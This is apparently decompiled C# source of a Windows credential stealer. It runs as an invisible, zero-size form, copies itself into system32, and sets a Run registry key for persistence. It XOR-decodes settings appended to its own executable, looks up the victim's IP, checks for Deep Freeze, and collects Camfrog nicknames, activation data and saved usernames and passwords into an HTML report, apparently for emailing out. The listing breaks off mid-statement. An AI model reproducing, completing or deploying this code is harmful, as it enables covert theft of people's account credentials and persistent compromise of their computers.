using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns3;

namespace ns4;

internal sealed class Form1 : Form
{
	private IContainer icontainer_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	public MailMessage mailMessage_0;

	public Attachment attachment_0;

	private string string_11;

	private string string_12;

	private string string_13;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		mailMessage_0 = null;
		attachment_0 = null;
		string_11 = Path.GetFileName(Application.get_ExecutablePath());
		string_12 = "<FONT face=\"Verdana\" color=#000000 size=1>";
		string_13 = "<FONT face=\"Verdana\" color=#FF0000 size=1>";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_03f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fb: Expected O, but got Unknown
		//IL_03ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		short num5 = default(short);
		int num6 = default(int);
		string[] array = default(string[]);
		string fileName = default(string);
		RegistryKey registryKey = default(RegistryKey);
		short num7 = default(short);
		short num8 = default(short);
		short num9 = default(short);
		short num10 = default(short);
		short num11 = default(short);
		TextBox val = default(TextBox);
		TextBox val2 = default(TextBox);
		WebClient webClient = default(WebClient);
		string text = default(string);
		WebClient webClient2 = default(WebClient);
		string text2 = default(string);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		string text3 = default(string);
		DirectoryInfo directoryInfo2 = default(DirectoryInfo);
		SmtpClient smtpClient = default(SmtpClient);
		MailMessage mailMessage = default(MailMessage);
		Attachment item = default(Attachment);
		Attachment item2 = default(Attachment);
		Attachment item3 = default(Attachment);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					TextBox val3;
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						((Control)this).Hide();
						goto IL_0009;
					case 12544:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_0025;
							case 5:
								goto IL_0035;
							case 6:
								goto IL_0044;
							case 7:
								goto IL_0068;
							case 8:
								goto IL_007d;
							case 9:
								goto IL_0095;
							case 10:
							case 11:
								goto IL_00a0;
							case 12:
								goto IL_00b6;
							case 13:
								goto IL_00cc;
							case 14:
								goto IL_00e2;
							case 15:
								goto IL_00f8;
							case 16:
								goto IL_010e;
							case 17:
								goto IL_0128;
							case 18:
								goto IL_0142;
							case 19:
								goto IL_015c;
							case 20:
								goto IL_0176;
							case 21:
								goto IL_0190;
							case 22:
								goto IL_01a8;
							case 23:
								goto IL_01c0;
							case 24:
								goto IL_01cf;
							case 25:
								goto IL_01d7;
							case 26:
								goto IL_01ec;
							case 27:
								goto IL_021f;
							case 28:
								goto IL_0230;
							case 29:
								goto IL_023f;
							case 30:
								goto IL_0247;
							case 31:
								goto IL_025c;
							case 32:
								goto IL_028f;
							case 33:
								goto IL_02a0;
							case 34:
								goto IL_02af;
							case 35:
								goto IL_02b7;
							case 36:
								goto IL_02cc;
							case 37:
								goto IL_02ff;
							case 38:
								goto IL_0310;
							case 39:
								goto IL_031f;
							case 40:
								goto IL_0327;
							case 41:
								goto IL_033c;
							case 42:
								goto IL_036f;
							case 43:
								goto IL_0380;
							case 44:
								goto IL_038f;
							case 45:
								goto IL_0397;
							case 46:
								goto IL_03ac;
							case 47:
								goto IL_03df;
							case 48:
								goto IL_03f0;
							case 49:
								goto IL_03fb;
							case 50:
								goto IL_0406;
							case 51:
								goto IL_0410;
							case 52:
								goto IL_0421;
							case 53:
								goto IL_042b;
							case 54:
								goto IL_0436;
							case 55:
								goto IL_0448;
							case 56:
								goto IL_0453;
							case 57:
								goto IL_0463;
							case 58:
								goto IL_0470;
							case 60:
								goto IL_047c;
							case 61:
								goto IL_0480;
							case 59:
							case 62:
							case 63:
								goto IL_048a;
							case 64:
								goto IL_04ae;
							case 65:
								goto IL_1c48;
							case 66:
								goto IL_1c58;
							case 67:
								goto IL_1c68;
							case 68:
							case 69:
								goto IL_2e17;
							case 70:
								goto IL_2e22;
							case 71:
								goto IL_2e2d;
							case 72:
								goto IL_2e3c;
							case 73:
								goto IL_2e4b;
							case 74:
								goto IL_2e6a;
							case 75:
								goto IL_2e86;
							case 76:
								goto IL_2e9c;
							case 77:
								goto IL_2ead;
							case 78:
								goto IL_2eb9;
							case 79:
								goto IL_2ec4;
							case 80:
								goto IL_2eda;
							case 81:
								goto IL_2ef0;
							case 82:
								goto IL_2f02;
							case 83:
								goto IL_2f13;
							case 84:
								goto IL_2f24;
							case 85:
								goto IL_2f36;
							case 86:
								goto IL_2f48;
							case 87:
								goto IL_2f5e;
							case 88:
								goto IL_2f6a;
							case 89:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 90:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_021f:
						num = 27;
						num5 = (short)unchecked(num5 + 1);
						goto IL_022a;
						IL_01ec:
						num = 26;
						string_5 += Conversions.ToString(Strings.Chr(num6 ^ Strings.Asc(Strings.Mid(array[1], unchecked((int)num5), 1))));
						goto IL_021f;
						IL_0009:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0012;
						IL_0012:
						num = 3;
						FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
						goto IL_0025;
						IL_0025:
						num = 4;
						if (Conversions.ToBoolean(string_10))
						{
							goto IL_0035;
						}
						goto IL_00a0;
						IL_0035:
						num = 5;
						fileName = Path.GetFileName(Application.get_ExecutablePath());
						goto IL_0044;
						IL_0044:
						num = 6;
						((ServerComputer)Class11.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\" + fileName, true);
						goto IL_0068;
						IL_0068:
						num = 7;
						registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						goto IL_007d;
						IL_007d:
						num = 8;
						registryKey.SetValue(fileName, "C:\\WINDOWS\\system32\\" + fileName);
						goto IL_0095;
						IL_0095:
						num = 9;
						registryKey.Close();
						goto IL_00a0;
						IL_00a0:
						num = 11;
						string_0 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00b6;
						IL_00b6:
						num = 12;
						string_1 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00cc;
						IL_00cc:
						num = 13;
						string_2 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00e2;
						IL_00e2:
						num = 14;
						string_3 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00f8;
						IL_00f8:
						num = 15;
						string_4 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_010e;
						IL_010e:
						num = 16;
						FileSystem.FileGet(1, ref string_0, -1L, false);
						goto IL_0128;
						IL_0128:
						num = 17;
						FileSystem.FileGet(1, ref string_1, -1L, false);
						goto IL_0142;
						IL_0142:
						num = 18;
						FileSystem.FileGet(1, ref string_2, -1L, false);
						goto IL_015c;
						IL_015c:
						num = 19;
						FileSystem.FileGet(1, ref string_3, -1L, false);
						goto IL_0176;
						IL_0176:
						num = 20;
						FileSystem.FileGet(1, ref string_4, -1L, false);
						goto IL_0190;
						IL_0190:
						num = 21;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_01a8;
						IL_01a8:
						num = 22;
						array = Strings.Split(string_0, "(&1R-EM&)", -1, (CompareMethod)0);
						goto IL_01c0;
						IL_01c0:
						num = 23;
						string_5 = "";
						goto IL_01cf;
						IL_01cf:
						num = 24;
						num6 = 47;
						goto IL_01d7;
						IL_01d7:
						num = 25;
						num7 = (short)Strings.Len(array[1]);
						num5 = 1;
						goto IL_022a;
						IL_022a:
						if (num5 <= num7)
						{
							goto IL_01ec;
						}
						goto IL_0230;
						IL_0230:
						num = 28;
						string_6 = "";
						goto IL_023f;
						IL_023f:
						num = 29;
						num6 = 47;
						goto IL_0247;
						IL_0247:
						num = 30;
						num8 = (short)Strings.Len(array[2]);
						num5 = 1;
						goto IL_029a;
						IL_029a:
						if (num5 <= num8)
						{
							goto IL_025c;
						}
						goto IL_02a0;
						IL_02a0:
						num = 33;
						string_7 = "";
						goto IL_02af;
						IL_02af:
						num = 34;
						num6 = 47;
						goto IL_02b7;
						IL_02b7:
						num = 35;
						num9 = (short)Strings.Len(array[3]);
						num5 = 1;
						goto IL_030a;
						IL_030a:
						if (num5 <= num9)
						{
							goto IL_02cc;
						}
						goto IL_0310;
						IL_0310:
						num = 38;
						string_8 = "";
						goto IL_031f;
						IL_031f:
						num = 39;
						num6 = 47;
						goto IL_0327;
						IL_0327:
						num = 40;
						num10 = (short)Strings.Len(array[4]);
						num5 = 1;
						goto IL_037a;
						IL_037a:
						if (num5 <= num10)
						{
							goto IL_033c;
						}
						goto IL_0380;
						IL_0380:
						num = 43;
						string_9 = "";
						goto IL_038f;
						IL_038f:
						num = 44;
						num6 = 47;
						goto IL_0397;
						IL_0397:
						num = 45;
						num11 = (short)Strings.Len(array[5]);
						num5 = 1;
						goto IL_03ea;
						IL_03ea:
						if (num5 <= num11)
						{
							goto IL_03ac;
						}
						goto IL_03f0;
						IL_03f0:
						num = 48;
						val = new TextBox();
						goto IL_03fb;
						IL_03fb:
						num = 49;
						val2 = new TextBox();
						goto IL_0406;
						IL_0406:
						num = 50;
						webClient = new WebClient();
						goto IL_0410;
						IL_0410:
						num = 51;
						text = webClient.DownloadString("http://whatismyip.com/automation/n09230945.asp");
						goto IL_0421;
						IL_0421:
						num = 52;
						webClient.Dispose();
						goto IL_042b;
						IL_042b:
						num = 53;
						webClient2 = new WebClient();
						goto IL_0436;
						IL_0436:
						num = 54;
						text2 = webClient2.DownloadString("http://www.1rsofty.t35.com/update/1R/whatsnew.txt");
						goto IL_0448;
						IL_0448:
						num = 55;
						webClient2.Dispose();
						goto IL_0453;
						IL_0453:
						num = 56;
						directoryInfo = new DirectoryInfo("C:\\Program Files\\Faronics\\Deep Freeze");
						goto IL_0463;
						IL_0463:
						num = 57;
						if (directoryInfo.get_Exists())
						{
							goto IL_0470;
						}
						goto IL_047c;
						IL_0470:
						num = 58;
						text3 = "YES";
						goto IL_048a;
						IL_047c:
						num = 60;
						goto IL_0480;
						IL_0480:
						num = 61;
						text3 = "NO";
						goto IL_048a;
						IL_048a:
						num = 63;
						val.set_Text(Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo", "NickName", "")));
						goto IL_04ae;
						IL_04ae:
						num = 64;
						val2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("<FONT face=\"Verdana\" color=#000000 size=1<MARQUEE bgcolor=#D8D8D8 direction=left loop=20 width=100%>", "<STRONG>" + text2), "</STRONG></MARQUEE></FONT></DIV><hr>"), "<FONT face=\"Verdana\" color=#000000 size=1"), string.Concat(string.Concat(">Machine Name: <b>" + string_13, Environment.UserName), "</FONT>")), string.Concat(string.Concat("</b><br>Time: <b>" + string_13, Conversions.ToString(((ServerComputer)Class11.smethod_0()).get_Clock().get_LocalTime())), "</FONT>")), string.Concat(string.Concat("</b><br>IP Adress: <b>" + string_13, text), "</FONT>")), string.Concat(string.Concat("</b><br>Deep Freeze detected: <b>" + string_13, text3), "</FONT>")), Operators.AddObject(Operators.AddObject((object)("</b><br>ActivationData: <b>" + string_13), Registry.GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo", "ActivationData", "")), (object)"</FONT>")), Operators.AddObject(Operators.AddObject((object)("</b><br>PhDeviceCLSID: <b>" + string_13), Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Telephony", "PhDeviceCLSID", "")), (object)"</b><hr></FONT></font>")), (object)"<FONT face=\"Verdana\" color=#000000 size=1"), (object)"<table cellpadding=\"2\" cellspacing=\"2\" width=%\">"), (object)"<tr>"), (object)"<td bgcolor=\"#cccccc\"><b>Username</b></td>"), (object)"<td bgcolor=\"#cccccc\"><b>Password</b></td>"), (object)"</tr>"), (object)"<tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "0", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "1", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "3", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "4", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "6", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "7", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "9", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "10", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "12", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "13", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "15", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "16", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "18", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "19", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "21", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "22", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "24", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "25", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "27", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "28", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "30", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "31", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "33", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "34", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "36", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "37", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "39", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "40", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "42", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "43", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "45", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "46", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "48", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "49", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "51", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "52", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "54", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "55", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "57", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "58", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "60", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "61", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "60", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "61", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", 